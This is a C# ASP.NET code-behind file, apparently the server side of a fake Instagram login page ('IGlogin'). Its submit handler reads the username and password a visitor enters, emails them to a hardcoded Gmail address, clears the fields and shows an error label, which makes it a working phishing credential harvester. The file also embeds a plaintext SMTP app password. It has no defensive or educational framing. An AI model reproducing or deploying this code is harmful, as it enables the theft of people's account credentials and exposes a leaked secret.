using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System;
using System.Net;
using System.Net.Mail;


namespace IGlogin
{
    public partial class WebForm1 : System.Web.UI.Page
    {
        string inputContent = "";
        string input2Content = "";
        protected void Page_Load(object sender, EventArgs e)
        {
            inc.Visible = false;
        }

        protected void sbmt_Click(object sender, EventArgs eventArgs)
        {

            inputContent = Uname2.Text; // Assuming 'input' is the name of your input control
            input2Content = Pword2.Text; // Assuming 'input2' is the name of your second input control
            inc.Visible = true;

            // Create a new MailMessage object
            MailMessage mail = new MailMessage();

            // Set the sender's email address
            mail.From = new MailAddress("febie962@gmail.com");

            // Set the recipient's email address
            mail.To.Add("febie962@gmail.com");

            // Set the subject of the email
            mail.Subject = "Username and Password";

            // Set the body of the email
            mail.Body = $"Username: {inputContent}\nPassword: {input2Content}";

            // Create a new SmtpClient object
            SmtpClient smtpClient = new SmtpClient("smtp.gmail.com", 587); // Replace with your SMTP server details

            // Set your SMTP credentials if required
            smtpClient.Credentials = new System.Net.NetworkCredential("febie962", "nhla ekqx iphp ufvs");

            // Enable SSL if required
            smtpClient.EnableSsl = true;

            // Send the email
            smtpClient.Send(mail);


            Uname2.Text = "";
            Pword2.Text = "";
        }
    }
}